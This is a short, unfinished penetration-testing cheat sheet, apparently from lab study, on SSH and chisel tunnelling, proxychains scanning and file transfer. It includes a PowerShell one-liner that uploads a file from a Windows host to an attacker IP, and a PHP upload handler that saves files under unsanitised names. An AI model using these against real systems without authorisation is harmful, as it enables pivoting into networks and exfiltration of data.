# Tunnel Proxy Transfer

## Tunnel

### ssh

#### local port forwarding

```bash
sudo ssh -N -L 127.0.0.1:8080:192.168.18.1:80 kali@127.0.0.1
```

#### remote port forwarding

```bash
sudo ssh -N -R 172.16.8.144:7070:192.168.18.1:80 kali@172.16.8.144
```

#### ssh tunnel

##### dynamic ssh tunnel

```bash
ssh -N -D 127.0.0.1:9090 yuanfh@172.16.8.136
```

##### reverse ssh tunnel

```bash
ssh -N -R 9090 kali@172.16.8.144
```

## Proxy

### proxychains

nmap -sT means TCP connect scan, you shuld add -sT when you use proxychains to scan.

```bash
proxychains nmap -sT -vv 192.168.18.1
```

```bash

### chisel

<https://github.com/jpillora/chisel>

chisel 是一个用于创建隧道的工具，它可以通过HTTP代理或者SOCKS5代理来创建隧道。

### dnsmasq

## Transfer

### download

#### rdp

```bash
xfreerdp /u:offsec /p:lab /v:192.168.159.61 /drive:home,/home/parallels/Downloads
```

### upload

#### appache php server

/var/www/html/upload.php

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir.$_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
```

```bash
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```

```powershell
powershell (new-object System.Net.WebClient).UploadFile('http://172.16.8.144/upload.php', 'C:\Users\Public\nc.exe')
```

## Tips

1.
